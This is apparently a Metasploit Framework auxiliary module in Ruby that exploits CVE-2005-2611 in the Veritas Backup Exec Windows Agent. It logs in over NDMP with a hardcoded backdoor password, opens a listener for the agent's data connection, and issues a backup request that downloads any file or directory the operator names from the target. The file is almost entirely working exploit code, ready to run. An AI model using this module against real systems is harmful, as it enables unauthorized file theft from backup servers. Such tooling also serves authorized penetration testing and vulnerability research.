##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::NDMP

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Veritas Backup Exec Windows Remote File Access',
			'Description'    => %q{
				This module abuses a logic flaw in the Backup Exec Windows Agent to download
				arbitrary files from the system. This flaw was found by someone who wishes to
				remain anonymous and affects all known versions of the Backup Exec Windows Agent. The
				output file is in 'MTF' format, which can be extracted by the 'NTKBUp' program
				listed in the references section. To transfer an entire directory, specify a
				path that includes a trailing backslash.
			},
			'Author'         => [ 'hdm', 'Unknown' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2005-2611'],
					['OSVDB', '18695'],
					['BID', '14551'],
					['URL', 'http://www.fpns.net/willy/msbksrc.lzh'],
				],
			'Actions'     =>
				[
					['Download']
				],
			'DefaultAction' => 'Download'
			))

		register_options(
			[
				Opt::RPORT(10000),
				OptAddress.new('LHOST',
					[
						false,
						"The local IP address to accept the data connection"
					]
				),
				OptPort.new('LPORT',
					[
						false,
						"The local port to accept the data connection"
					]
				),
				OptString.new('RPATH',
					[
						true,
						"The remote filesystem path to download",
						"C:\\boot.ini"
					]
				),
				OptString.new('LPATH',
					[
						true,
						"The local filename to store the exported data",
						"backupexec_dump.mtf"
					]
				),
			], self.class)
	end

	def run
		print_status("Attempting to retrieve #{datastore['RPATH']}...")

		lfd = File.open(datastore['LPATH'], 'wb')

		connect
		data = ndmp_recv()
		if (not data)
			print_error("Did not receive a response from the agent")
			disconnect
			return
		end

		username = "root"
		password = "\xb4\xb8\x0f\x26\x20\x5c\x42\x34\x03\xfc\xae\xee\x8f\x91\x3d\x6f"

		#
		# Authenticate using the backdoor password
		#
		auth = [
			1,
			Time.now.to_i,
			0,
			0x0901,
			0,
			0,
			2,
			username.length,
			username,
			password
		].pack('NNNNNNNNA*A*')

		print_status("Sending magic authentication request...")
		ndmp_send(auth)
		data = ndmp_recv()
		if (not data)
			print_error("Did not receive a response to our authentication request")
			disconnect
			return
		end


		#
		# Create our listener for the data connection
		#
		print_status("Starting our data listener...")
		sfd = Rex::Socket.create_tcp_server(
			'LocalPort' => datastore['LPORT']
		)

		local_addr = (datastore['LHOST'] || Rex::Socket.source_address(datastore['RHOST']))
		local_port = sfd.getsockname[2]

		#
		# Create the DATA_CONNECT request
		#
		conn = [
			3,
			0,
			0,
			0x040a,
			0,
			0,
			1,
			Rex::Socket.gethostbyname(local_addr)[3],
			local_port
		].pack('NNNNNNNA4N')

		print_status("Sending data connection request...")
		ndmp_send(conn)
		data = ndmp_recv()
		if (not data)
			print_error("Did not receive a response to our data connection request")
			sfd.close
			disconnect
			return
		end

		#
		# Wait for the agent to connect back
		#
		print_status("Waiting for the data connection...")
		rfd = sfd.accept()
		sfd.close


		#
		# Create the Mover Set Record Size request
		#
		msrs = [
			4,
			0,
			0,
			0x0a08,
			0,
			0,
			0x8000
		].pack('NNNNNNN')

		print_status("Sending transfer parameters...")
		ndmp_send(msrs)
		data = ndmp_recv()
		if (not data)
			print_error("Did not receive a response to our parameters request")
			disconnect
			return
		end

		#
		# Define our tranfer parameters
		#
		xenv =
		[
			['USERNAME', ''],
			['BU_EXCLUDE_ACTIVE_FILES', '0'],
			['FILESYSTEM', "\"\\\\#{datastore['RHOST']}\\#{datastore['RPATH']}\",v0,t0,l0,n0,f0"]
		]

		#
		# Create the DATA_START_BACKUP request
		#
		bkup = [
			5,
			0,
			0,
			0x0401,
			0,
			0,
			4
		].pack('NNNNNNN')
		bkup += "dump"
		bkup += [ xenv.length ].pack('N')

		#
		# Encode the transfer parameters
		#
		xenv.each do |e|
			k,v = e

			# Variable
			bkup += [k.length].pack('N')
			bkup += k
			bkup += Rex::Encoder::NDR.align(k)

			# Value
			bkup += [v.length].pack('N')
			bkup += v
			bkup += Rex::Encoder::NDR.align(v)
		end

		bkup[-1, 1] = "\x01"

		print_status("Sending backup request...")
		ndmp_send(bkup)
		data = ndmp_recv()
		if (not data)
			print_error("Did not receive a response to our backup request")
			disconnect
			return
		end

		#
		# Create the GET_ENV request
		#
		genv = [
			5,
			0,
			0,
			0x4004,
			0,
			0
		].pack('NNNNNN')

		print_status("Sending environment request...")
		ndmp_send(genv)
		data = ndmp_recv()
		if (not data)
			print_error("Did not receive a response to our environment request")
			disconnect
			return
		end

		#
		# Start transferring data
		#
		print_status("Transferring data...")
		bcnt = 0

		begin
			while (data = rfd.get_once)
				bcnt += data.length
				lfd.write(data)
			end
		rescue ::EOFError
		end

		lfd.close
		rfd.close

		print_status("Transferred #{bcnt} bytes.")
		disconnect

	end

end
